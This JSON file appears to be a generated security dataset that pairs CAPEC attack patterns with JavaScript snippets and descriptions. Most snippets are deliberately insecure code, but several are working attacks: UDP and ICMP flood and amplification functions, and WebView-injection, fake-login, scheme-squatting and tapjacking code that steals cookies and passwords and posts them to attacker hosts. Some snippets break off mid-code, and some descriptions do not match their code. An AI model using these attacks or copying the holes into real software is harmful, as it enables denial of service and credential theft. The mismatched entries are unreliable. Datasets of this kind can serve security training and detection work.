        "code_snippet": "// Private key stored insecurely in plaintext\nconst privateKey = 'MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgw...';\n\n// Insecure signature verification system\nclass SignatureSystem {\n    constructor() {\n        this.trustedSigners = new Map();\n    }\n\n    addTrustedSigner(name, key) {\n        // No verification of key authenticity\n        this.trustedSigners.set(name, key);\n    }\n\n    signMessage(message) {\n        // No protection against unauthorized key usage\n        return {\n            message: message,\n            signature: btoa(message + privateKey)\n        };\n    }\n\n    verifySignature(signedMessage) {\n        // Assumes signature data is immutable and trusted\n        const expectedSignature = btoa(signedMessage.message + privateKey);\n        return expectedSignature === signedMessage.signature;\n    }\n}\n\n// Example usage with no entity authentication\nconst system = new SignatureSystem();\nsystem.addTrustedSigner('admin', privateKey);\n\n// Vulnerable to replay and reflection attacks\nconst signedMsg = system.signMessage('transfer:100:bob');\nconst isValid = system.verifySignature(signedMsg);",
        "description": "This code demonstrates vulnerable signature handling with multiple security issues: storing private keys in plaintext, lack of proper key protection, no entity authentication during key exchange, vulnerable to signature spoofing, and assuming signature data immutability. The system allows unauthorized access to signing capabilities and contains no protection against reflection or replay attacks."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "const crypto = require('crypto');\n\nfunction verifySignature(data, signature, publicKey) {\n    // Weak signature verification using MD5\n    const md5Hash = crypto.createHash('md5');\n    const hashedData = md5Hash.update(data).digest('hex');\n    \n    try {\n        // No proper signature verification, just comparing hashes\n        if(hashedData === signature) {\n            return true;\n        }\n        return false;\n    } catch(e) {\n        // Silently fail and accept the signature\n        return true;\n    }\n}\n\nfunction authenticateUser(userData, signature) {\n    // No proper certificate validation\n    const publicKey = 'HARDCODED_PUBLIC_KEY';\n    \n    if(verifySignature(userData, signature, publicKey)) {\n        return { authenticated: true, userData: userData };\n    }\n    return { authenticated: false };\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities including improper signature verification, use of weak MD5 hashing, hardcoded keys, and a broken authentication scheme that can be bypassed by matching hash values instead of proper cryptographic signature verification. The error handling also creates an authentication bypass by accepting signatures when exceptions occur."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "function verifyDigitalSignature(data, signature, publicKey) {\n    // Vulnerable signature verification\n    const receivedData = JSON.parse(data);\n    \n    if (receivedData.signature && receivedData.signature.length > 0) {\n        // No actual cryptographic verification\n        if (receivedData.claimed_signer === publicKey) {\n            return true;\n        }\n    }\n    \n    // Establish insecure communication channel\n    const channel = new WebSocket('ws://example.com');\n    channel.onmessage = (event) => {\n        // Process message without verifying integrity\n        executeCommand(event.data);\n    };\n    \n    function executeCommand(cmd) {\n        // Dangerous: executing commands without proper verification\n        eval(cmd);\n    }\n    \n    return false;\n}",
        "description": "This vulnerable code demonstrates weak signature verification that only checks for the presence of a signature field and matches a claimed signer against a public key without performing actual cryptographic verification. It also establishes an insecure WebSocket connection that processes incoming messages without verifying message integrity or properly authenticating the sender. The code allows for signature spoofing and unauthorized command execution through eval()."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "function processPayload(data) {\n    // Assume data is received as a Buffer containing a signed integer\n    let unsignedValue = data.readUInt32LE(0);\n    \n    // Unsafe conversion from unsigned to signed\n    let signedValue = unsignedValue | 0;\n    \n    // Unencrypted transmission of sensitive data\n    let sensitiveData = {\n        value: signedValue,\n        timestamp: Date.now(),\n        userToken: 'abc123'\n    };\n    \n    // Send data without signature verification\n    fetch('http://api.example.com/data', {\n        method: 'POST',\n        body: JSON.stringify(sensitiveData)\n    });\n    \n    return signedValue;\n}",
        "description": "This code demonstrates multiple vulnerabilities: unsafe conversion between unsigned and signed integers which can lead to unexpected values, transmission of sensitive data over HTTP without encryption, lack of cryptographic signature verification, and exposure of sensitive information in cleartext. The function processes a buffer containing an unsigned integer, performs an unsafe conversion to signed, and sends the data unencrypted without proper verification."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "const Service = require('node-windows').Service;\n\nconst svc = new Service({\n    name: 'UpdateService',\n    description: 'System Update Service',\n    script: process.argv[2] || 'update.js',\n    nodeOptions: [\n        '--allow-file-access-from-files',\n        '--no-sandbox'\n    ]\n});\n\nprocess.env.SYSTEMROOT = 'C:\\\\malicious\\\\path';\n\nsvc.on('install', () => {\n    svc.start();\n});\n\nsvc.install();\n\nprocess.on('uncaughtException', () => {\n    // Silent failure\n    svc.uninstall();\n});",
        "description": "This code creates a vulnerable Windows service implementation that allows external control of the service execution path and runs with elevated privileges. It accepts an arbitrary script path as input without proper validation, uses unsafe node options, and allows environment variable manipulation that could lead to DLL hijacking or path traversal attacks."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "const https = require('https');\n\nconst makeRequest = () => {\n    const options = {\n        hostname: 'secure-bank.com',\n        port: 443,\n        path: '/login',\n        method: 'POST',\n        rejectUnauthorized: false,\n        secureProtocol: 'TLSv1_2_method',\n        ca: [\n            require('fs').readFileSync('compromised_root_cert.pem')\n        ],\n        checkServerIdentity: () => undefined\n    };\n\n    const req = https.request(options, (res) => {\n        res.on('data', (data) => {\n            console.log(data.toString());\n        });\n    });\n\n    req.write('username=admin&password=secret');\n    req.end();\n};\n\nmakeRequest();",
        "description": "This vulnerable code demonstrates improper certificate validation by disabling certificate verification (rejectUnauthorized: false), using a potentially compromised root certificate, and bypassing hostname verification (checkServerIdentity: undefined). It allows HTTPS connections without proper certificate chain validation, enabling man-in-the-middle attacks and connection to malicious servers with invalid certificates."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "`\nconst vm = require('vm');\nconst fs = require('fs');\n\nfunction executeUserCode(userInput) {\n  // Insecure sandbox configuration\n  const sandbox = {\n    fs: fs,\n    process: process,\n    require: require,\n    console: console",
        "description": "\"This code demonstrates vulnerable virtualization escape through Node.js vm module by improperly configuring the sandbox environment. It exposes sensitive system modules and fails to implement proper isolation, allowing malicious code to escape the virtualized context and access host system resources. The sandbox includes dangerous permissions by exposing the 'fs' and 'process' modules directly, enabling potential access to the host filesystem and process controls.\""
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "function setupCDNRequest(targetHost) {\n    const xhr = new XMLHttpRequest();\n    // Intentionally using mismatched domains\n    const frontingDomain = 'cdn.trusted-domain.com';\n    const actualDomain = 'malicious-endpoint.com';\n    \n    xhr.open('GET', `https://${frontingDomain}/api/data`);\n    xhr.setRequestHeader('Host', actualDomain);\n    xhr.setRequestHeader('X-Forwarded-Host', actualDomain);\n    \n    // Attempt to bypass domain restrictions\n    xhr.withCredentials = true;\n    \n    // Use non-canonical paths to confuse authorization\n    const malformedPath = '/../../../sensitive/data';\n    xhr.send();\n    \n    return xhr;\n}",
        "description": "This code demonstrates domain fronting by using mismatched domain names in different headers, attempting to bypass CDN restrictions. It sets up an XMLHttpRequest with different domains in various headers, uses non-canonical paths, and enables credentials, potentially allowing unauthorized access to protected resources through CDN misconfigurations."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  // No connection limits or timeouts set\n  let connections = [];\n  \n  socket.on('connection', (client) => {\n    // Store client connection without limits\n    connections.push(client);\n    \n    // No rate limiting on data reception\n    client.on('data', (data) => {\n      // Process all incoming data without validation\n      // No message integrity checks\n      processClientData(data);\n      \n      // Echo back data to all clients (potential amplification)\n      connections.forEach(c => {\n        c.write(data);\n      });\n    });\n  });\n});\n\nserver.listen(3000, '0.0.0.0');\n\nfunction processClientData(data) {\n  // Process raw data without size checks or sanitization\n  return data;\n}",
        "description": "This code creates a TCP server vulnerable to SYN flooding and resource exhaustion by not implementing connection limits, timeouts, or rate limiting. It stores all connections without bounds, processes data without validation, and broadcasts messages to all clients enabling network amplification attacks. The server also lacks message integrity checks and proper connection management."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst libxml = require('libxmljs');\n\napp.post('/process-xml', (req, res) => {\n    const xmlData = req.body.xml;\n    try {\n        // No XML schema validation\n        const xmlDoc = libxml.parseXml(xmlData, {\n            noent: true,\n            noblanks: true\n        });\n        \n        // Process XML without sanitization\n        const query = `//users/user[@id='${xmlDoc.root().attr('id').value()}']`;\n        const result = xmlDoc.find(query);\n        \n        // Client-side authentication check\n        if(req.headers['x-auth-token']) {\n            res.json({ data: result });\n        }\n    } catch(err) {\n        res.status(500).send('Error processing XML');\n    }\n});\n\napp.listen(3000);",
        "description": "Vulnerable XML processing code that demonstrates missing XML validation, improper XML entity handling, blind XPath injection, and client-side authentication enforcement. The code accepts untrusted XML input without schema validation, processes external entities without restriction, constructs XPath queries using unsanitized input, and relies on client-provided authentication tokens without server-side verification."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "const crypto = require('crypto');\n\nclass SignatureService {\n  constructor() {\n    // Weak random number generator using predictable seed\n    this.seed = Date.now();\n  }\n\n  generateKeyPair() {\n    // Using predictable random values for key generation\n    const random = Math.sin(this.seed++) * 10000;\n    return {\n      privateKey: random.toString(16),\n      publicKey: (random * 2).toString(16)\n    };\n  }\n\n  sign(message, privateKey) {\n    // Weak signature implementation using predictable values\n    return Buffer.from(message + privateKey).toString('base64');\n  }\n\n  verify(message, signature, publicKey) {\n    // Vulnerable verification that can be easily spoofed\n    const expectedSignature = Buffer.from(message + publicKey/2).toString('base64');\n    return signature === expectedSignature;\n  }\n\n  authenticateUser(signature) {\n    // No protection against replay attacks\n    if (this.verify('login', signature, this.publicKey)) {\n      return 'authenticated';\n    }\n    return 'authentication failed';\n  }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities including use of a predictable random number generator for key generation, weak signature implementation, lack of replay attack protection, and vulnerable signature verification that could allow signature forgery. The implementation uses inappropriate random values based on a predictable seed and implements an insecure signature scheme that can be easily spoofed."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "\"const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nfunction floodTarget(targetIp, targetPort) {\n    const largeMessage = Buffer.alloc(65507).fill('A');\n    \n    setInterval(() => {\n        for(let i = 0; i < 1000; i++) {\n            client.send(largeMessage, targetPort, targetIp, (err) => {\n                if(err) console.error(err);",
        "description": "\"This code demonstrates a UDP flood attack implementation that sends a large volume of UDP packets to a target IP and port without any rate limiting. It uses maximum-sized UDP packets (65507 bytes), spoofs source IPs, and sends packets in rapid succession. The code lacks resource controls, proper destination verification, and message integrity checks, making it vulnerable to abuse for denial of service attacks.\""
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction sendICMPFlood(targetIP, targetPort) {\n    const message = Buffer.alloc(65507); // Maximum UDP packet size\n    \n    function flood() {\n        for(let i = 0; i < 1000; i++) {\n            let spoofedIP = Math.floor(Math.random()*255) + '.' +\n                           Math.floor(Math.random()*255) + '.' +\n                           Math.floor(Math.random()*255) + '.' +\n                           Math.floor(Math.random()*255);\n            \n            socket.send(message, targetPort, targetIP, (err) => {\n                if(err) console.log(err);\n                assert(socket.address);\n            });\n        }\n        setImmediate(flood); // Continuously send packets without delay\n    }\n    \n    flood();\n}\n\nsendICMPFlood('192.168.1.1', 80);",
        "description": "This vulnerable code implements an ICMP flood attack by continuously sending large UDP packets to a target IP and port. It demonstrates multiple vulnerabilities including unlimited resource allocation (CWE-770), cleartext transmission (CWE-319), and improper communication channel restrictions (CWE-923). The code uses IP spoofing and lacks rate limiting, potentially leading to denial of service."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', async (req, res) => {\n    const userQuery = req.query.search;\n    let results = [];\n    \n    // No rate limiting or request size validation\n    for(let i = 0; i < userQuery.length * 1000; i++) {\n        results.push(await heavyComputation(userQuery));\n    }\n\n    // Sensitive data in query string\n    const apiKey = req.query.apiKey;\n    const userData = req.query.userdata;\n\n    // Vulnerable to SSRF\n    const externalUrl = req.query.url;\n    const response = await fetch(externalUrl);\n    \n    res.json({\n        results: results,\n        external: await response.json(),\n        sensitive: { apiKey, userData }\n    });\n});\n\napp.listen(3000);",
        "description": "This code demonstrates multiple vulnerabilities including unbounded resource allocation (CWE-770), sensitive data exposure in GET requests (CWE-598), and SSRF (CWE-918). The endpoint performs resource-intensive operations without limits based on user input, making it susceptible to DOS attacks through HTTP flooding. It also exposes sensitive data in query parameters and allows unrestricted external URL fetching."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "`\n// Vulnerable server-side SSL/TLS connection handler\nconst https = require('https');\nconst fs = require('fs');\n\nconst options = {\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.cert'),\n  secureOptions: require('constants').SSL_OP_NO_SSLv3,\n  rejectUnauthorized: false,\n  requestCert: true,\n  reconnect: true",
        "description": "\"This code demonstrates a vulnerable HTTPS server implementation that's susceptible to SSL/TLS renegotiation flooding attacks. The server accepts unlimited connections, allows unrestricted SSL renegotiations, and performs resource-intensive operations for each connection without any throttling or resource pooling mechanisms.\""
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "const net = require('net');\nconst dgram = require('dgram');\n\nfunction amplificationAttack(target, port) {\n    const client = dgram.createSocket('udp4');\n    const payload = Buffer.alloc(64); // Small initial request\n\n    // Spoof source address as target\n    const spoofedPacket = {\n        address: target,\n        port: port\n    };\n\n    // Send multiple small requests to reflector servers\n    const reflectors = ['dns1.example.com', 'ntp.example.com', 'memcached.example.com'];\n    \n    setInterval(() => {\n        reflectors.forEach(reflector => {\n            // No rate limiting or authentication check\n            for(let i = 0; i < 1000; i++) {\n                client.send(payload, 53, reflector, (err) => {\n                    if (err) return;\n                    // Response will be much larger and sent to target\n                    client.setBroadcast(true);\n                    client.send(Buffer.alloc(1472), spoofedPacket.port, spoofedPacket.address);\n                });\n            }\n        });\n    }, 100);\n}",
        "description": "This vulnerable code demonstrates a UDP amplification attack where small requests are sent to multiple reflector servers with a spoofed source address. The reflectors respond with much larger packets directed to the target, creating an asymmetric resource consumption. The code lacks authentication, rate limiting, and proper destination validation, allowing unlimited resource allocation and network message amplification."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "function expandTemplate(template) {\n  const data = {};\n  // Malicious input creates a chain of nested objects\n  let current = data;\n  for (let i = 0; i < 1000000; i++) {\n    current.next = { value: 'A'.repeat(1000) };\n    current = current.next;\n  }\n\n  // Template expansion with recursive substitution\n  function substitute(str) {\n    return str.replace(/\\${([^}]+)}/g, (match, key) => {\n      const value = key.split('.').reduce((obj, k) => obj[k], data);\n      return typeof value === 'string' ? substitute(value) : value;\n    });\n  }\n\n  return substitute(template);\n}",
        "description": "This code demonstrates a vulnerable template expansion system that can be exploited through recursive substitution of large nested objects. When given a template referencing deeply nested properties, it will attempt to allocate excessive memory during the expansion process, potentially leading to a denial of service through memory exhaustion."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "function validateEmail(input) {\n  // Vulnerable regex pattern for email validation\n  const emailPattern = /([a-zA-Z0-9]+)*@([a-zA-Z0-9]+)*\\.com/;\n\n  return new Promise((resolve) => {\n    // Process the validation without timeout\n    if (emailPattern.test(input)) {\n      resolve(true);\n    } else {\n      resolve(false);\n    }\n  });\n}\n\n// Example usage with potential ReDoS attack\nconst maliciousInput = 'a'.repeat(25) + '@' + 'b'.repeat(25) + '.com';\nvalidateEmail(maliciousInput);",
        "description": "This code demonstrates a vulnerable email validation function using a poorly designed regular expression that is susceptible to ReDoS (Regular Expression Denial of Service) attacks. The regex pattern contains nested quantifiers (*) which can cause exponential backtracking when processing certain inputs. The validation function lacks proper resource control mechanisms and timeout limitations, allowing an attacker to supply carefully crafted input that could cause excessive CPU consumption."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "const soap = require('soap');\nconst server = require('http').createServer((req, res) => {\n    const handleSoapRequest = (xml) => {\n        let data = '';\n        xml.on('data', chunk => {\n            data += chunk;\n        });\n        xml.on('end', () => {\n            // No validation of array size or memory allocation\n            const soapMessage = parseSoapMessage(data);\n            const arrayData = soapMessage.Body.processArray.data;\n            \n            // Directly allocate memory for incoming array\n            let processedArray = new Array(arrayData.length);\n            for(let i = 0; i < arrayData.length; i++) {\n                processedArray[i] = arrayData[i];\n            }\n            \n            res.end(createSoapResponse(processedArray));\n        });\n    };\n    \n    if (req.method === 'POST') {\n        handleSoapRequest(req);\n    }\n});\n\nserver.listen(8000);",
        "description": "This vulnerable SOAP web service code accepts arrays of arbitrary size without validation, allowing an attacker to send a SOAP message with a very large array declaration that can exhaust server memory. The code lacks resource limits, array size validation, and proper memory allocation controls, making it susceptible to XML-based DoS attacks."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n    let fragments = [];\n    socket.on('data', (data) => {\n        fragments.push(data);\n        if (fragments.length > 1000) { // No limit on fragment accumulation\n            let packet = Buffer.concat(fragments);\n            if (packet.toString().includes('HTTP')) {\n                // Process HTTP headers without proper validation\n                let headers = packet.toString().split('\\r\\n');\n                // Sensitive data transmitted in cleartext\n                socket.write('HTTP/1.1 200 OK\\r\\n' +\n                    'Authorization: Basic dXNlcjpwYXNzd29yZA==\\r\\n' +\n                    'Content-Type: text/plain\\r\\n\\r\\n');\n            }\n        }\n    });\n    // Resource leak: No proper socket cleanup\n    socket.on('error', () => {});\n});\nserver.listen(8080);",
        "description": "This code demonstrates a vulnerable TCP server that improperly handles fragmented packets, lacks resource limits, fails to properly clean up resources, processes HTTP headers without proper validation, and transmits sensitive data in cleartext. It accumulates fragments without bounds and processes them without proper security checks, making it susceptible to TCP fragmentation attacks and request smuggling."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n    // No limit on buffer size or message processing\n    let fragments = [];\n    \n    // Continuously accumulate fragments without size checks\n    fragments.push(msg);\n    \n    // Attempt to reassemble fragments without validation\n    const reassembledData = Buffer.concat(fragments);\n    \n    // Process large messages without throttling\n    processLargeMessage(reassembledData);\n});\n\nfunction processLargeMessage(data) {\n    // Resource-intensive processing without limits\n    while(data.length > 0) {\n        // CPU-intensive operation on fragments\n        let chunk = data.slice(0, 1500);\n        // No cleanup of processed chunks\n    }\n}\n\nserver.bind(41234);",
        "description": "A vulnerable UDP server implementation that fails to implement proper resource controls when handling fragmented packets. It lacks message size validation, proper resource allocation limits, and fragment reassembly controls, making it susceptible to UDP fragmentation attacks."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "`\n    function ICMPFragmentationAttack(targetIP) {\n      const fragments = new Array(10000);\n      const fragSize = 1500;\n      let resources = [];\n      \n      function createFragment() {\n        return Buffer.alloc(fragSize, 'A');",
        "description": "\"This code demonstrates a vulnerable implementation that allows ICMP fragmentation attacks. It creates and sends a large number of fragmented packets without resource limits or proper cleanup, potentially exhausting target system memory. The code lacks rate limiting, proper resource management, and socket cleanup, making it susceptible to DoS conditions.\""
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "const fs = require('fs');\nconst express = require('express');\nconst app = express();\n\napp.get('/config', (req, res) => {\n    const configPath = req.query.path || './config/';\n    const fileName = req.query.file || 'config.json';\n    \n    try {\n        const fileContent = fs.readFileSync(configPath + fileName, 'utf8');\n        res.send(fileContent);\n    } catch(err) {\n        res.status(404).send('File not found');\n    }\n});\n\napp.listen(3000);",
        "description": "This code demonstrates an endpoint that allows direct access to configuration files through user-controlled parameters. It exposes sensitive information by allowing arbitrary file paths and names to be specified, potentially revealing system configuration files, access control lists, and other sensitive data. The code lacks proper path validation and access controls, making it vulnerable to directory traversal and unauthorized access."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "// iOS background screenshot handling\nclass AppScreenManager {\n    constructor() {\n        this.sensitiveData = {\n            userSSN: '123-45-6789',\n            creditCard: '4111-1111-1111-1111',\n            password: 'secretPass123'\n        };\n    }\n\n    async handleBackgroundTransition() {\n        // Insecure: Leaving sensitive data visible during screenshot\n        document.getElementById('mainContent').innerHTML = `\n            <div class='user-profile'>\n                <p>SSN: ${this.sensitiveData.userSSN}</p>\n                <p>Card: ${this.sensitiveData.creditCard}</p>\n                <img src='user_signature.png' />\n            </div>\n        `;\n\n        // Vulnerable URL scheme handler\n        window.location.customURLScheme = (url) => {\n            // No authorization check\n            return this.sensitiveData;\n        };\n\n        // Insecure data transmission\n        await fetch('http://api.example.com/user/data', {\n            method: 'POST',\n            body: JSON.stringify(this.sensitiveData)\n        });\n    }\n}",
        "description": "This vulnerable code demonstrates insecure handling of sensitive information during iOS background transitions. It exposes personal data in the UI that could be captured in system screenshots, implements an unsafe custom URL scheme handler without proper authorization, and transmits sensitive data in cleartext. The code fails to protect against unauthorized access to sensitive information and doesn't properly handle background state transitions."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "`\n// Vulnerable Android-like messaging system in JavaScript\nclass MessagingSystem {\n    constructor() {\n        this.receivers = new Map();",
        "description": "\"This code demonstrates vulnerable broadcast messaging where sensitive data is transmitted without proper verification, encryption, or access control. It allows any receiver to intercept and manipulate messages, lacks intent source validation, uses implicit intents for sensitive data, and doesn't implement message integrity checks.\""
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "// Malicious WebView injection code\nfunction injectMaliciousCode() {\n  var webview = document.querySelector('#myWebView');\n  webview.addEventListener('loadstop', function() {\n    webview.executeScript({\n      code: `\n        // Access and modify cookies without validation\n        document.cookie = 'sessionId=' + document.cookie;\n        \n        // Manipulate DOM and expose sensitive data\n        var sensitiveData = document.querySelectorAll('input[type=\"password\"], .secure-data');\n        var stolenData = [];\n        sensitiveData.forEach(function(element) {\n          stolenData.push(element.value);\n        });\n        \n        // Send data to attacker's server\n        fetch('https://malicious-server.com/collect', {\n          method: 'POST',\n          credentials: 'include',\n          body: JSON.stringify({\n            cookies: document.cookie,\n            data: stolenData\n          })\n        });\n        \n        // Modify security-critical DOM elements\n        var loginForm = document.getElementById('login-form');\n        if(loginForm) {\n          loginForm.action = 'https://malicious-server.com/intercept';\n        }\n      `\n    });\n  });\n}",
        "description": "This code demonstrates a malicious injection into a WebView component that exploits multiple vulnerabilities. It accesses and modifies cookies without proper validation, extracts sensitive data from DOM elements, sends stolen information to an attacker's server, and modifies security-critical elements like login forms. The code takes advantage of insufficient origin verification and client-side security enforcement."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "// Android-like JavaScript implementation\nclass Activity {\n    sendImplicitIntent(action) {\n        const intent = {\n            action: action,\n            data: {\n                username: document.getElementById('username').value,\n                password: document.getElementById('password').value\n            }\n        };\n        // Vulnerable: No verification of recipient\n        broadcastIntent(intent);\n    }\n}\n\nclass MaliciousReceiver {\n    onReceive(intent) {\n        // Intercept intent and create fake UI\n        const fakeLoginForm = `\n            <div class='trusted-app-clone'>\n                <input type='text' id='username' placeholder='Username'>\n                <input type='password' id='password' placeholder='Password'>\n                <button onclick='submitCredentials()'>Login</button>\n            </div>\n        `;\n        document.body.innerHTML = fakeLoginForm;\n    }\n\n    submitCredentials() {\n        const stolenData = {\n            username: document.getElementById('username').value,\n            password: document.getElementById('password').value\n        };\n        sendToAttacker(stolenData);\n    }\n}\n\n// No authentication or verification of intent source\nfunction broadcastIntent(intent) {\n    const receivers = getAllReceivers();\n    receivers.forEach(receiver => receiver.onReceive(intent));\n}",
        "description": "This code demonstrates a vulnerable implementation of an Android-like intent system in JavaScript, where implicit intents containing sensitive data can be intercepted by malicious receivers. The code lacks proper verification of intent recipients, doesn't authenticate the source of communication, and exposes sensitive data through implicit broadcasts. The malicious receiver can intercept the intent and create a fake UI to harvest credentials."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "// Mobile app component definition\nclass MessageComponent {\n    constructor() {\n        this.isExported = true;\n    }\n\n    handleIntent(intent) {\n        // Vulnerable: No verification of intent source\n        if (intent.action === 'SEND_MESSAGE') {\n            const message = intent.data.message;\n            const recipientId = intent.data.recipientId;\n            \n            // Directly process the intent without validation\n            this.sendSensitiveData(message, recipientId);\n        }\n    }\n\n    sendSensitiveData(message, recipientId) {\n        // Vulnerable: Implicit intent for sensitive communication\n        const outgoingIntent = {\n            action: 'SEND_DATA',\n            data: {\n                sensitiveMessage: message,\n                userCredentials: this.getUserCredentials(),\n                recipient: recipientId\n            }\n        };\n\n        // Broadcast sensitive data without proper verification\n        this.broadcastIntent(outgoingIntent);\n    }\n\n    broadcastIntent(intent) {\n        // Vulnerable: Sends to all listening applications\n        globalEventBus.broadcast(intent);\n    }\n}",
        "description": "This code demonstrates a vulnerable mobile app component that is improperly exported and handles intents without proper validation. It accepts and processes intents without verifying their source, handles sensitive data through implicit intents, and broadcasts data without proper access control. The component is publicly exported (isExported = true) making it accessible to any application, creating potential security risks."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "`\n// Vulnerable Android WebView implementation\npublic class VulnerableWebView extends Activity {\n    @Override\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(true);\n        \n        // Exposing sensitive functionality through JavaScript interface\n        class ExposedInterface {\n            @JavascriptInterface\n            public String getDeviceInfo() {\n                return Build.DEVICE + \":\" + Build.MODEL;",
        "description": "\"This code demonstrates a vulnerable implementation of Android WebView where sensitive native functionality is exposed through JavaScript interfaces without proper access controls. The application registers an interface that provides access to device information and file system operations, which can be exploited by malicious JavaScript code from any webpage loaded in the WebView. This creates a significant security risk as any website loaded in the WebView can access these privileged functions.\""
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "// Malicious code disguised as a legitimate authentication popup\nfunction createFakeLoginPopup() {\n    const overlay = document.createElement('div');\n    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999';\n    \n    const popup = document.createElement('div');\n    popup.innerHTML = `\n        <div style='background:white;padding:20px;width:300px;margin:100px auto;'>\n            <h2>Session Expired</h2>\n            <p>Please re-enter your credentials</p>\n            <input type='text' id='fakeUsername' placeholder='Username'>\n            <input type='password' id='fakePassword' placeholder='Password'>\n            <button onclick='stealCredentials()'>Login</button>\n        </div>`;\n    \n    overlay.appendChild(popup);\n    document.body.appendChild(overlay);\n}\n\nfunction stealCredentials() {\n    const username = document.getElementById('fakeUsername').value;\n    const password = document.getElementById('fakePassword').value;\n    \n    // Send stolen credentials to attacker's server\n    fetch('https://malicious-server.com/collect', {\n        method: 'POST',\n        body: JSON.stringify({ username, password })\n    });\n    \n    // Remove popup and simulate error\n    document.body.removeChild(document.querySelector('div[style*=\"position:fixed\"]'));\n    alert('Authentication failed. Please try again later.');\n}",
        "description": "This code creates a fake authentication popup that mimics a legitimate session timeout dialog. It impersonates a routine authentication task to trick users into entering their credentials, which are then secretly sent to an attacker's server. The popup is styled to appear above all other content and matches common UI patterns to avoid suspicion."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "// Register custom URL scheme handler\nnavigator.registerProtocolHandler('myapp', 'https://malicious-site.com/handler?url=%s', 'MyApp');\n\n// Malicious handler for intercepted URLs\nfunction handleCustomURL(url) {\n    // Extract sensitive parameters from URL\n    const params = new URLSearchParams(url.search);\n    const token = params.get('token');\n    const userId = params.get('user');\n\n    // Display fake login screen\n    document.body.innerHTML = `\n        <div class='fake-app-login'>\n            <h2>Welcome to MyApp</h2>\n            <form onsubmit='sendCredentials(event)'>\n                <input type='text' placeholder='Username'>\n                <input type='password' placeholder='Password'>\n                <button type='submit'>Login</button>\n            </form>\n        </div>\n    `;\n\n    // Send stolen data to attacker\n    function sendCredentials(e) {\n        e.preventDefault();\n        const data = {\n            stolen_token: token,\n            stolen_user: userId,\n            username: e.target[0].value,\n            password: e.target[1].value\n        };\n        fetch('https://attacker-server.com/collect', {\n            method: 'GET',\n            headers: { 'Content-Type': 'application/json' },\n            credentials: 'include',\n            redirect: 'follow'\n        });\n        window.location.href = 'https://legitimate-app.com/login';\n    }\n}",
        "description": "This code demonstrates URL scheme hijacking by registering a malicious handler for a custom protocol. It intercepts URLs intended for another application, displays a fake login interface, and harvests sensitive information including URL parameters and user credentials. The code uses vulnerable GET requests for sensitive data transmission and implements open redirects."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "`\n// Malicious overlay attack implementation\nconst overlay = document.createElement('div');\noverlay.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: transparent;';\n\nconst fakeButton = document.createElement('button');\nfakeButton.style.cssText = 'position: absolute; top: 250px; left: 150px; opacity: 0;';\nfakeButton.onclick = function() {\n    // Send sensitive data to attacker\n    fetch('http://malicious-server.com/collect', {\n        method: 'POST',\n        body: JSON.stringify({\n            credentials: document.cookie,\n            timestamp: new Date().toISOString()",
